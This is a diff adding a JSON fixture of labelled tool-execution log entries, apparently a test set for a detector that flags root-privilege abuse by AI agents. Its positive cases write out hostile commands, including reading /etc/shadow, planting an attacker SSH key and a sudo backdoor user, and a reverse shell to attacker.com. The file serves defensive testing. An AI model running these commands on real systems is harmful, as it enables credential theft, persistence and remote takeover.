@@ -1,0 +1,294 @@
+[
+    {
+        "description": "Discovery command revealing root context",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:00:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "uid=0(root) gid=0(root)",
+            "parameters": {
+                "command": "id"
+            },
+            "tool_result": "uid=0(root) gid=0(root) groups=0(root)"
+        },
+        "should_trigger": true,
+        "attack_type": "Root privilege discovery"
+    },
+    {
+        "description": "Reading /etc/shadow as root",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:00:15Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "uid=0(root)",
+            "parameters": {
+                "command": "cat /etc/shadow"
+            },
+            "tool_result": "root:$6$rounds=4096$...:19234:0:99999:7:::"
+        },
+        "should_trigger": true,
+        "attack_type": "Credential file access"
+    },
+    {
+        "description": "File tool accessing /etc/shadow",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:00:30Z",
+            "event_type": "tool_execution",
+            "tool_name": "read_file",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "root",
+            "parameters": {
+                "path": "/etc/shadow"
+            },
+            "tool_result": "root:$6$rounds=4096$...:19234:0:99999:7:::"
+        },
+        "should_trigger": true,
+        "attack_type": "Sensitive file read via file tool"
+    },
+    {
+        "description": "Adding SSH key for persistence",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:01:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "uid=0(root)",
+            "parameters": {
+                "command": "echo 'ssh-rsa AAAA...attacker-key...' >> /root/.ssh/authorized_keys"
+            },
+            "tool_result": ""
+        },
+        "should_trigger": true,
+        "attack_type": "SSH key persistence"
+    },
+    {
+        "description": "Creating backdoor user",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:01:30Z",
+            "event_type": "tool_execution",
+            "tool_name": "run_shell",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "euid=0",
+            "parameters": {
+                "command": "useradd -m -s /bin/bash -G sudo backdoor"
+            },
+            "tool_result": ""
+        },
+        "should_trigger": true,
+        "attack_type": "Backdoor user creation"
+    },
+    {
+        "description": "Setting password for backdoor user",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:01:45Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "uid=0(root)",
+            "parameters": {
+                "command": "echo 'backdoor:password123' | chpasswd"
+            },
+            "tool_result": ""
+        },
+        "should_trigger": true,
+        "attack_type": "Backdoor password setting"
+    },
+    {
+        "description": "Establishing reverse shell",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:02:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "root",
+            "parameters": {
+                "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+            },
+            "tool_result": ""
+        },
+        "should_trigger": true,
+        "attack_type": "Reverse shell establishment"
+    },
+    {
+        "description": "Docker socket abuse for container escape",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:02:30Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "uid=0(root)",
+            "parameters": {
+                "command": "docker run -v /:/host --privileged alpine chroot /host"
+            },
+            "tool_result": ""
+        },
+        "should_trigger": true,
+        "attack_type": "Docker socket abuse for host escape"
+    },
+    {
+        "description": "Modifying /etc/sudoers",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:03:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "write_file",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "root",
+            "parameters": {
+                "path": "/etc/sudoers.d/backdoor",
+                "content": "backdoor ALL=(ALL) NOPASSWD:ALL"
+            },
+            "tool_result": "success"
+        },
+        "should_trigger": true,
+        "attack_type": "Sudoers modification for privilege persistence"
+    },
+    {
+        "description": "Setting SUID bit on binary",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:03:30Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "uid=0(root)",
+            "parameters": {
+                "command": "chmod +s /tmp/backdoor_binary"
+            },
+            "tool_result": ""
+        },
+        "should_trigger": true,
+        "attack_type": "SUID binary creation"
+    },
+    {
+        "description": "Reading process status to confirm root",
+        "log_entry": {
+            "timestamp": "2025-12-09T10:04:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "shell",
+            "server_id": "devops-assistant-001",
+            "session_id": "sess-abc123",
+            "user_context": "UID: 0",
+            "parameters": {
+                "command": "cat /proc/self/status | grep -i uid"
+            },
+            "tool_result": "Uid:\t0\t0\t0\t0"
+        },
+        "should_trigger": true,
+        "attack_type": "Process status privilege confirmation"
+    },
+    {
+        "description": "Normal file read by non-root user",
+        "log_entry": {
+            "timestamp": "2025-12-09T09:00:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "read_file",
+            "server_id": "document-helper-001",
+            "session_id": "sess-def456",
+            "user_context": "uid=1000(appuser) gid=1000(appuser)",
+            "parameters": {
+                "path": "/home/appuser/documents/report.txt"
+            },
+            "tool_result": "Report content..."
+        },
+        "should_trigger": false,
+        "attack_type": "Normal non-root file read"
+    },
+    {
+        "description": "Normal command execution by non-root user",
+        "log_entry": {
+            "timestamp": "2025-12-09T09:05:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "build-assistant-001",
+            "session_id": "sess-ghi789",
+            "user_context": "uid=1001(builder)",
+            "parameters": {
+                "command": "npm run build"
+            },
+            "tool_result": "Build completed successfully"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal non-root command execution"
+    },
+    {
+        "description": "Discovery command by non-root user",
+        "log_entry": {
+            "timestamp": "2025-12-09T09:10:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "dev-assistant-001",
+            "session_id": "sess-jkl012",
+            "user_context": "uid=1000(developer)",
+            "parameters": {
+                "command": "id"
+            },
+            "tool_result": "uid=1000(developer) gid=1000(developer) groups=1000(developer)"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal non-root identity check"
+    },
+    {
+        "description": "Legitimate docker command by non-root user",
+        "log_entry": {
+            "timestamp": "2025-12-09T09:15:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "execute_command",
+            "server_id": "ci-runner-001",
+            "session_id": "sess-mno345",
+            "user_context": "uid=1002(ciuser) gid=999(docker)",
+            "parameters": {
+                "command": "docker run hello-world"
+            },
+            "tool_result": "Hello from Docker!"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal docker usage by non-root"
+    },
+    {
+        "description": "Tool execution event without user context",
+        "log_entry": {
+            "timestamp": "2025-12-09T09:20:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "calculate",
+            "server_id": "math-helper-001",
+            "session_id": "sess-pqr678",
+            "parameters": {
+                "expression": "2 + 2"
+            },
+            "tool_result": "4"
+        },
+        "should_trigger": false,
+        "attack_type": "Normal tool without user context"
+    },
+    {
+        "description": "Root user reading non-sensitive file (authorized admin)",
+        "log_entry": {
+            "timestamp": "2025-12-09T11:00:00Z",
+            "event_type": "tool_execution",
+            "tool_name": "read_file",
+            "server_id": "admin-assistant-001",
+            "session_id": "sess-stu901",
+            "user_context": "uid=0(root)",
+            "parameters": {
+                "path": "/var/log/application.log"
+            },
+            "tool_result": "Log entries...",
+            "authorized": true,
+            "admin_session": true
+        },
+        "should_trigger": false,
+        "attack_type": "Authorized admin file read (false positive scenario)"
+    }
+]
+
